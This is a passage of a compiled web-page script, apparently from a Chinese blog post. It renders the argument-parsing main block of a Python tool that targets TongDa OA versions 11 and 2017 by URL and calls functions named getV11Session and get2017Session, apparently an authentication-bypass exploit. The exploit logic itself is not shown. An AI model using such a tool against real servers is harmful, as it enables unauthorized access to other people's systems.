"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"__main__"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    parser "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" argparse"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("ArgumentParser"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    parser"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("add_argument"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"-v"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"--tdoaversion"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("type")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("int")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n        choices"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("11")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("2017")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("help")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Target TongDa OA Version. e.g: -v 11、-v 2017"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    parser"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("add_argument"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"-url"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"--targeturl"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("type")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("str")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("help")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Target URL. e.g: -url 192.168.2.1、-url http://192.168.2.1"')]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    args "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" parser"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("parse_args"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    url "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" args"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("targeturl\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'http://'")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("not")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" url"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n        url "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'http://'")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" url\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" args"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("tdoaversion "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("11")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n        getV11Session"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("url"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("elif")]),s._v(" args"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("tdoaversion "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("2017")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n        get2017Session"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("url"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("else")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n        parser"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("print_help"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br"),n("span",{staticClass:"line-number"},[s._v("19")]),n("br"),n("span",{staticClass:"line-number"},[s._v("20")]),n("br"),n("span",{staticClass:"line-number"},[s._v("21")]),n("br"),n("span",{staticClass:"line-number"},[s._v("22")]),n("br"),n("span",{staticClass:"line-number"},[s._v("23")]),n("br"),n("span",{staticClass:"line-number"},[s._v("24")]),n("br"),n("span",{staticClass:"line-number"},[s._v("25")]),n("br"),n("span",{staticClass:"line-number"},[s._v("26")]),n("br"),n("span",{staticClass:"line-number"},[s._v("27")]),n("br"),n("span",{staticClass:"line-number"},[s._v("28")]),n("br"),n("span",{staticClass:"line-number"},[s._v("29")]),n("br"),n("span",{staticClass:"line-number"},[s._v("30")]),n("br"),n("span",{staticClass:"line-number"},[s._v("31")]),n("br"),n("span",{staticClass:"line-number"},[s._v("32")]),n("br"),n("span",{staticClass:"line-number"},[s._v("33")]),n("br"),n("span",{staticClass:"line-number"},[s._v("34")]),n("br"),n("span",{staticClass:"line-number"},[s._v("35")]),n("br"),n("span",{staticClass:"line-number"},[s._v("36")]),n("br"),n("span",{staticClass:"line-number"},[s._v("37")]),n("br"),n("span",{staticClass:"line-number"},[s._v("38")]),n("br"),n("span",{staticClass:"line-number"},[s._v("39")]),n("br"),n("span",{staticClass:"line-number"},[s._v("40")]),n("br"),n("span",{staticClass:"line-number"},[s._v("41")]),n("br"),n("span",{staticClass:"line-number"},[s._v("42")]),n("br"),n("span",{staticClass:"line-number"},[s._v("43")]),n("br"),n("span",{staticClass:"line-number"},[s._v("44")]),n("br"),n("span",{staticClass:"line-number"},[s._v("45")]),n("br"),n("span",{staticClass:"line-number"},[s._v("46")]),n("br"),n("span",{staticClass:"line-number"},[s._v("47")]),n("br"),n("span",{staticClass:"line-number"},[s._v("48")]),n("br"),n("span",{staticClass:"line-number"},[s._v("49")]),n("br"),n("span",{staticClass:"line-number"},[s._v("50")]),n("br"),n("span",{staticClass:"line-number"},[s._v("51")]),n("br"),n("span",{staticClass:"line-number"},[s._v("52")]),n("br"),n("span",{staticClass:"line-number"},[s._v("53")]),n("br"),n("span",{staticClass:"line-number"},[s._v("54")]),n("br"),n("span",{staticClass:"line-number"},[s._v("55")]),n("br"),n("span",{staticClass:"line-number"},[s._v("56")]),n("br"),n("span",{staticClass:"line-number"},[s._v("57")]),n("br"),n("span",{staticClass:"line-number"},[s._v("58")]),n("br"),n("span",{staticClass:"line-number"},[s._v("59")]),n("br"),n("span",{staticClass:"line-number"},[s._v("60")]),n("br"),n("span",{staticClass:"line-number"},[s._v("61")]),n("br"),n("span",{staticClass:"line-number"},[s._v("62")]),n("br"),n("span",{staticClass:"line-number"},[s._v("63")]),n("br"),n("span",{staticClass:"line-number"},[s._v("64")]),n("br"),n("span",{staticClass:"line-number"},[s._v("65")]),n("br"),n("span",{staticClass:"line-number"},[s._v("66")]),n("br"),n("span",{staticClass:"line-number"},[s._v("67")]),n("br"),n("span",{staticClass:"line-number"},[s._v("68")]),n("br"),n("span",{staticClass:"line-number"},[s._v("69")]),n("br"),n("span",{staticClass:"line-number"},[s._v("70")]),n("br"),n("span",{staticClass:"line-number"},[s._v("71")]),n("br"),n("span",{staticClass:"line-number"},[s._v("72")]),n("br"),n("span",{staticClass:"line-number"},[s._v("73")]),n("br"),n("span",{staticClass:"line-number"},[s._v("74")]),n("br"),n("span",{staticClass:"line-number"},[s._v("75")]),n("br"),n("span",{staticClass:"line-number"},[s._v("76")]),n("br"),n("span",{staticClass:"line-number"},[s._v("77")]),n("br"),n("span",{staticClass:"line-number"},[s._v("78")]),n("br"),n("span",{staticClass:"line-number"},[s._v("79")]),n("br"),n("span",{staticClass:"line-number"},[s._v("80")]),n("br"),n("span",{staticClass:"line-number"},[s._v("81")]),n("br"),n("span",{staticClass:"line-number"},[s._v("82")]),n("br"),n("span",{staticClass:"line-number"},[s._v("83")]),n("br"),n("span",{staticClass:"line-number"},[s._v("84")]),n("br"),n("span",{staticClass:"line-number"},[s._v("85")]),n("br"),n("span",{staticClass:"line-number"},[s._v("86")]),n("br"),n("span",{staticClass:"line-number"},[s._v("87")]),n("br"),n("span",{staticClass:"line-number"},[s._v("88")]),n("br"),n("span",{staticClass:"line-number"},[s._v("89")]),n("br"),n("span",{staticClass:"line-number"},[s._v("90")]),n("br"),n("span",{staticClass:"line-number"},[s._v("91")]),n("br"),n("span",{staticClass:"line-number"},[s._v("92")]),n("br"),n("span",{staticClass:"line-number"},[s._v("93")]),n("br"),n("span",{staticClass:"line-number"},[s._v("94")]),n("br"),n("span",{staticClass:"line-number"},[s._v("95")]),n("br"),n("span",{staticClass:"line-number"},[s._v("96")]),n("br"),n("span",{staticClass:"line-number"},[s._v("97")]),n("br"),n("span",{staticClass:"line-number"},[s._v("98")]),n("br")])]),n("p",[s._v("若有收获，就点个赞吧")])],1)}),[],!1,null,null,null);t.default=r.exports}}]);